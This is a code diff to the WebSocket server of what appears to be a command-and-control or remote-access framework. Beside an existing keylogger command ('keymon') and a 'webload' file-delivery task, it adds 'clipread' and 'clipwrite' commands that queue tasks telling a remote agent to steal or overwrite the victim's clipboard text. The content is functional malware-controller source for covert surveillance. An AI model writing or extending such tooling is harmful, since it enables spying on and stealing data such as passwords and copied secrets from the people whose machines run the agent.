@@ -125,6 +125,8 @@ export const setupWS = (httpServer) => {
             const agentHelp = {...helpData};
             if (agent.agentType === 0){ // The main C agent
               agentHelp["keymon <secs>"] = "Run a keylogger for given seconds";
+              agentHelp["clipread"] = "Get text from clipboard";
+              agentHelp["clipwrite <text>"] =  "Write text to clipboard";
             }
             let cmds = Object.keys(agentHelp).sort();
             let maxLen = 0;
@@ -256,6 +258,15 @@ export const setupWS = (httpServer) => {
                 agentID, taskType: "webload", data: {url, file}
               });
             }
+          }else if (input === "clipread"){
+            taskModel.createTask(username, {
+              agentID, taskType: "clipread"
+            });
+          }else if (input.startsWith("clipwrite ")){
+            let text = input.substr(10)
+            taskModel.createTask(username, {
+              agentID, taskType: "clipwrite", data: {text}
+            });
           }else if (input === "abort"){
             taskModel.createTask(username, {
               agentID, taskType: "abort"
